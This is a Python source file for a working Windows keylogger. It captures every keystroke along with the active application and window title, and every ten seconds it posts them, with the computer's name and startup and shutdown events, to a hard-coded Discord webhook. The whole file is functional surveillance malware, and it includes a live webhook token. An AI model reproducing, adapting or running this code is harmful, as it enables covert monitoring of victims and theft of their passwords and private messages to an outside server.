import os
import psutil
import requests
import time
import socket
import win32gui
import win32process
import keyboard
import threading
import atexit
from datetime import datetime

# Discord Webhook URL
WEBHOOK_URL = "https://discordapp.com/api/webhooks/1355720476252704798/QfHQTbLamSNlG9dywD-F5hiytst3Cy2tL76Nf6gVtv9GtdU6BKf1XXluZ5UW6ZimOg-B"

# Get PC name
PC_NAME = socket.gethostname()

# Tracking Variables
last_logged = None
last_app_name = None
last_window_title = None
current_app_name = None
current_window_title = None
keystrokes = ""
keystroke_lock = threading.Lock()
keystroke_app = "Unknown"
keystroke_window = "Unknown"

# Function to send logs to Discord
def send_to_discord(message):
    payload = {"content": f"```{message}```"}  # Format logs for better readability
    try:
        response = requests.post(WEBHOOK_URL, json=payload)
        response.raise_for_status()
    except requests.exceptions.RequestException as e:
        print(f"Error sending message to Discord: {e}")

# Function to log system startup
def log_system_start():
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    message = f"[{timestamp}] {PC_NAME} - System started, Connection Established"
    send_to_discord(message)

# Function to log system shutdown
def log_system_shutdown():
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    message = f"[{timestamp}] {PC_NAME} - System shutting down, Connection Lost"
    send_to_discord(message)

# Register shutdown hook
atexit.register(log_system_shutdown)

# Function to get active window title
def get_active_window_title():
    hwnd = win32gui.GetForegroundWindow()
    if not hwnd:
        return None, None
    
    _, pid = win32process.GetWindowThreadProcessId(hwnd)
    
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['pid'] == pid:
            return proc.info['name'], win32gui.GetWindowText(hwnd)
    
    return None, None

# Function to send keystrokes
def send_keystrokes():
    global keystrokes, keystroke_app, keystroke_window
    
    with keystroke_lock:
        if keystrokes.strip():
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            send_to_discord(f"[{timestamp}] [Keystrokes] {PC_NAME} ({keystroke_app} - {keystroke_window}): {keystrokes}")
            keystrokes = ""
            keystroke_app, keystroke_window = "Unknown", "Unknown"

# Function to log keystrokes
def log_keystroke(event):
    global keystrokes, keystroke_app, keystroke_window
    
    key = event.name
    
    with keystroke_lock:
        if not keystrokes:
            keystroke_app, keystroke_window = get_active_window_title() or ("Unknown", "Unknown")
        
        if len(key) == 1 and key.isprintable():
            keystrokes += key
        elif key == "space":
            keystrokes += " "
        elif key == "enter":
            keystrokes += "\n"
        elif key == "backspace" and keystrokes:
            keystrokes = keystrokes[:-1]

# Start keylogger thread
keyboard.on_press(log_keystroke)
def start_keylogger():
    keyboard.wait()

keylogger_thread = threading.Thread(target=start_keylogger, daemon=True)
keylogger_thread.start()

# Function to periodically send keystrokes
def keystroke_monitor():
    while True:
        time.sleep(10)  # Reduced delay for more real-time logging
        send_keystrokes()

keystroke_thread = threading.Thread(target=keystroke_monitor, daemon=True)
keystroke_thread.start()

# Monitoring loop
def monitor():
    global last_logged, last_app_name, last_window_title, current_app_name, current_window_title
    
    log_system_start()
    try:
        while True:
            new_app_name, new_window_title = get_active_window_title()
            
            if new_app_name and new_window_title:
                if (new_app_name, new_window_title) != (current_app_name, current_window_title):
                    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    if current_app_name and current_window_title:
                        log_message = (f"[{timestamp}] {PC_NAME} - Active Window: {new_app_name} ({new_window_title})")
                    else:
                        log_message = f"[{timestamp}] {PC_NAME} - Active Window: {new_app_name} ({new_window_title})"
                    
                    send_to_discord(log_message)
                    last_logged = (new_app_name, new_window_title)
                    current_app_name, current_window_title = new_app_name, new_window_title
            
            time.sleep(1)  # Reduced sleep time for more real-time updates
    except KeyboardInterrupt:
        log_system_shutdown()
        raise

if __name__ == "__main__":
    monitor()
